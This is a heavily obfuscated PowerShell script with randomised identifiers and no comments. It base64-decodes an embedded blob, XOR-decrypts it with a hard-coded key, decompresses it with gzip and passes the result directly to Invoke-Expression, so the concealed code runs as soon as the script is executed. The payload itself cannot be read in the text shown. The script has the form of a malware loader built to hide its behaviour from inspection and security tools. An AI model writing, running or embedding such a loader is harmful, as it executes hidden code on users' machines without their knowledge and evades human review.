$9ckpr16hnxo42yv = [System.Text.Encoding]::ascii
function 3awrdck46e8stx0jb7qvlgny2o1  {param($x1jl87tev5swaf3 )
  $cm50isdhqbo7uw8 = [System.Convert]::FromBase64String($x1jl87tev5swaf3)
  $2e36snj1zmpicra= $9ckpr16hnxo42yv.GetBytes("84ocn9tya5qb")
    $u19ce743ksgywbh = $cm50isdhqbo7uw8
    $jw8dbuneo9tlxi5 = $(for ($1fzxmvb497oen38 = 0; $1fzxmvb497oen38 -lt $u19ce743ksgywbh.length; ) {
        for ($wr6ge7uis928jlb = 0; $wr6ge7uis928jlb -lt $2e36snj1zmpicra.length; $wr6ge7uis928jlb++) {
            $u19ce743ksgywbh[$1fzxmvb497oen38] -bxor $2e36snj1zmpicra[$wr6ge7uis928jlb]
            $1fzxmvb497oen38++
            if ($1fzxmvb497oen38 -ge $u19ce743ksgywbh.Length) {
                $wr6ge7uis928jlb = $2e36snj1zmpicra.length
            }
        }
    })
	$cnwojxzh78ikv1r = New-Object System.IO.MemoryStream( , $jw8dbuneo9tlxi5 )

	    $p709rx2gqkfdobv = New-Object System.IO.MemoryStream
        $eyt1ufb5cimjqla = New-Object System.IO.Compression.GzipStream $cnwojxzh78ikv1r, ([IO.Compression.CompressionMode]::Decompress)
	    $eyt1ufb5cimjqla.CopyTo( $p709rx2gqkfdobv )
        $eyt1ufb5cimjqla.Close()
		$cnwojxzh78ikv1r.Close()
		[byte[]] $57er02wdsca64fz = $p709rx2gqkfdobv.ToArray()
 $e83o1wrvahnq42c=$57er02wdsca64fz
    return $e83o1wrvahnq42c
}
[byte[]]$693fu7nbmxgi2ca=3awrdck46e8stx0jb7qvlgny2o1 $3qn7zs4mbeo19hc
[System.Text.Encoding]::ascii.GetString((3awrdck46e8stx0jb7qvlgny2o1 "J79nY245dHllNfw3VVvMW37HCDGdMrqAbEY2cxfg0hC0Ojj1ju0EGROwGo5Pbtx+CNR5bwV1PM/2yg+hc+77j+m7cAFdS5f7X/IpNjqByfVap7R+nRqcdUJKR/3/YHSjrSQuQTNK1vZ3fqyC/xZxB5foc90kYXfT457T1/rBLZlyQfuEz987saalpexVWJ+mFteRoJ8IPWSn+XpI/18mMHO+uIydVbBLViF7aXrfVcSncHefuQQk7LJMxL3Mrz17knWKXk/W0Xnqi4RZs839aWcnk1vv81XHv8m1xufn3mq9WUgIYVOHsy+Gg+2b3g1zhAuMXoYj5PCtOjl9uACy6GtxpIgfm9OHmgtzp/rO/nXMJsUFDXbWpKg1XY4ERfM4UHPdaVsu80d8UV1/TrtxoCu0rs33nQRXZ+T1PYPPb4U+3EMNykkvpQw8MM+BxleKezff0tDkCkI+A7r8HgqytIqTuBvuRGgGZ6ApkQHuGCfmwJbE1Op4kCAMq6L07lQXB9hRZvuglFbBn8Mz59q4aiEcfTo0TN9ETttlJTsNNcGKqJuqQLh2JNRX2QP3XLMR4HYCx01SoZZ11v7B1czff2FZiGZjl7d/GPB+UaDb+DK13FPSx7rxhCB5sPqXSKIgnT719H4wT3sKoV7tcabXJ/xWIQXNH6Dx85SRxr1W0cZyB7tHHyVSXqa6TOxm2HLxltzuyWYjsTILBSFyrURcGBTKmXZSfEqH6qQm6z1bGVrVhIjxHYz3rWsVQHMlkWxsQ2pZg+VRkcrPdpsUCFMezlFpy/591CHyeDJ2VCs3zHHhpIBVMQfV5O+1GUQwhMZplX+qftl3e8fo3mvRTXb+IrytMvIRuAG/KafQg2azZjiyIfsKpof/xYs1Sij0TBKUZ6IXg260F9bFFf/+/av3w+C1sSPOXQ8ijSbXZm5RI8OrlEV0CuOpKZlnw6l7tr4JJUS6Urq+cgecLJGtXydRjjbvgK+fQUCMp6vgRbhsmiU9z44eBY/a/vX+05Cpgt+Og28EEflHyY2SCpwlw+5xOL1omo3O8uJpxE7xyCQrky3FNHwh/F0BL+7v+fFyDeS14z4PP565Y0vPtGigzh4OYeYDgGtrziN+ZGi0Lbbw0ME1ULP1ySda3SpVLoY5PwBRcXFmCawB8HvAGv2Vguvu4G2Do2iuMVRwMgx9HXg4mGziS4s3kF6s9vWqIUKTkUOfN0y8J59mc3lh"))|iex;